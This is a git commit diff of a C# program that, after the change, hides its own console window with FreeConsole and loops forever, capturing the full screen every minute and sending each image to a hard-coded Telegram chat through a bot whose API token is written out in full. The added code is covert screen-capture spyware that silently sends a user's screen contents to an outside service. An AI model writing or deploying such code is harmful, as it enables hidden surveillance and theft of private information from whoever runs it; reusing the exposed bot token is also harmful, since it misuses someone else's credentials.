cf1785d699fec59d13eafc5b327b3c1adf27f1da
berdikulov-571 <mygithub571@gmail.com>
2024-02-06 15:13:42 +0500

    Program.cs

--- WindowScreenshot.Console/Program.cs
+++ WindowScreenshot.Console/Program.cs
@@ -1,8 +1,9 @@
 ﻿using System.Drawing.Imaging;
 using System.Drawing;
-using System.Runtime.InteropServices;
 using Telegram.Bot;
 using Telegram.Bot.Types.InputFiles;
+using WindowScreenshot.Console;
+using System.Runtime.InteropServices;
 
 
 namespace WindowScreenshot
@@ -11,54 +12,46 @@ namespace WindowScreenshot
     {
         private static ITelegramBotClient _botClient;
 
+        [DllImport("kernel32.dll")]
+        private static extern bool AllocConsole();
+
+        [DllImport("kernel32.dll")]
+        private static extern bool FreeConsole();
+
         static async Task Main(string[] args)
         {
+            FreeConsole();
+
             _botClient = new TelegramBotClient("6530285040:AAFOZe4HLj89L-yHVkyJLKrtqO9H2PSpxx4");
-
-            Rectangle screenBounds = GetPrimaryScreenBounds();
-            using Bitmap screenshot = new(screenBounds.Width, screenBounds.Height);
-
-            using var graphics = Graphics.FromImage(screenshot);
-            graphics.CopyFromScreen(screenBounds.Location, Point.Empty, screenBounds.Size);
-
-            using var ms = new MemoryStream();
-            screenshot.Save(ms, ImageFormat.Png);
-            byte[] imageBytes = ms.ToArray();
-            var base64Image = Convert.ToBase64String(imageBytes);
 
             _botClient.StartReceiving();
 
-            InputOnlineFile photo = new InputOnlineFile(new MemoryStream(imageBytes), "screnshoot.jpg");
+            ScreenshotService service = new ScreenshotService();
 
-            await _botClient.SendPhotoAsync(2017110018,photo);
-        }
+            Rectangle screenBounds = service.GetPrimaryScreenBounds();
+            
+            while(true)
+            {
+                using var ms = new MemoryStream();
+                
+                using Bitmap screenshot = new(screenBounds.Width, screenBounds.Height);
+            
+                using var graphics = Graphics.FromImage(screenshot);
+           
+                graphics.CopyFromScreen(screenBounds.Location, Point.Empty, screenBounds.Size);
 
-        [DllImport("user32.dll")]
-        static extern IntPtr GetDesktopWindow();
+                screenshot.Save(ms, ImageFormat.Png);
+            
+                byte[] imageBytes = ms.ToArray();
+      
+                InputOnlineFile photo = new InputOnlineFile(new MemoryStream(imageBytes), "screnshoot.jpg");
 
-        [DllImport("user32.dll")]
-        static extern IntPtr GetDC(IntPtr hWnd);
+                await _botClient.SendPhotoAsync(2017110018,photo);
 
-        [DllImport("user32.dll")]
-        static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
+                Thread.Sleep(60000);
 
-        [DllImport("user32.dll")]
-        static extern int GetSystemMetrics(int nIndex);
-
-        public const int SM_CXSCREEN = 0;
-        public const int SM_CYSCREEN = 1;
-
-        static Rectangle GetPrimaryScreenBounds()
-        {
-            IntPtr desktopWindow = GetDesktopWindow();
-            IntPtr hdc = GetDC(desktopWindow);
-
-            int screenWidth = GetSystemMetrics(SM_CXSCREEN);
-            int screenHeight = GetSystemMetrics(SM_CYSCREEN);
-
-            ReleaseDC(desktopWindow, hdc);
-
-            return new Rectangle(0, 0, screenWidth, screenHeight);
+                GC.Collect();
+            }
         }
     }
 }
